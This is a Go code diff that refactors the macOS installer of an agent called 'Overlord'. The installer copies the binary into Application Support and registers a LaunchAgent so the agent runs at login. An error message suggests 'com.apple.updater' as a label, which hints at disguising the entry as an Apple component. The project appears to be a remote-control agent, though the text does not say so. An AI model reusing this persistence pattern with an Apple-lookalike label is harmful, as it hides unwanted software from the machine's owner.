@@ -12,6 +12,17 @@ import (
 	"text/template"
 )
 
+var currentUserHomeDir = func() (string, error) {
+	usr, err := user.Current()
+	if err != nil {
+		return "", err
+	}
+	if usr.HomeDir == "" {
+		return "", fmt.Errorf("current user home directory is empty")
+	}
+	return usr.HomeDir, nil
+}
+
 const launchAgentPlist = `<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -48,26 +59,37 @@ func plistLabel() string {
 	return "com.overlord.agent"
 }
 
+func validateStartupName() error {
+	if DefaultStartupName != "" && !strings.HasPrefix(DefaultStartupName, "com.") {
+		return fmt.Errorf("startup name %q is invalid for macOS: LaunchAgent labels must start with \"com.\" (e.g. com.apple.updater)", DefaultStartupName)
+	}
+	return nil
+}
+
 func getPlistPath() (string, error) {
-	usr, err := user.Current()
+	homeDir, err := currentUserHomeDir()
 	if err != nil {
 		return "", err
 	}
-	return filepath.Join(usr.HomeDir, "Library", "LaunchAgents", plistLabel()+".plist"), nil
+	return filepath.Join(homeDir, "Library", "LaunchAgents", plistLabel()+".plist"), nil
 }
 
 func getTargetPath() (string, error) {
-	usr, err := user.Current()
+	if err := validateStartupName(); err != nil {
+		return "", err
+	}
+
+	homeDir, err := currentUserHomeDir()
 	if err != nil {
 		return "", err
 	}
-	return filepath.Join(usr.HomeDir, "Library", "Application Support", "Overlord", binaryName()), nil
+	return filepath.Join(homeDir, "Library", "Application Support", "Overlord", binaryName()), nil
 }
 
 func install(exePath string) error {
 
-	if DefaultStartupName != "" && !strings.HasPrefix(DefaultStartupName, "com.") {
-		return fmt.Errorf("startup name %q is invalid for macOS: LaunchAgent labels must start with \"com.\" (e.g. com.apple.updater)", DefaultStartupName)
+	if err := validateStartupName(); err != nil {
+		return err
 	}
 
 	targetPath, err := getTargetPath()
@@ -150,11 +172,11 @@ func replaceExecutable(exePath, targetPath string) error {
 
 	if err := os.Rename(tmpPath, targetPath); err != nil {
 		if removeErr := os.Remove(targetPath); removeErr == nil {
-			if err = os.Rename(tmpPath, targetPath); err == nil {
-				return nil
-			}
+			err = os.Rename(tmpPath, targetPath)
 		}
-		return fmt.Errorf("failed to replace executable at %s: %w", targetPath, err)
+		if err != nil {
+			return fmt.Errorf("failed to replace executable at %s: %w", targetPath, err)
+		}
 	}
 
 	if err := os.Chmod(targetPath, 0755); err != nil {
@@ -165,6 +187,10 @@ func replaceExecutable(exePath, targetPath string) error {
 }
 
 func configure(exePath string) error {
+	if err := validateStartupName(); err != nil {
+		return err
+	}
+
 	plistPath, err := getPlistPath()
 	if err != nil {
 		return fmt.Errorf("failed to get plist path: %w", err)
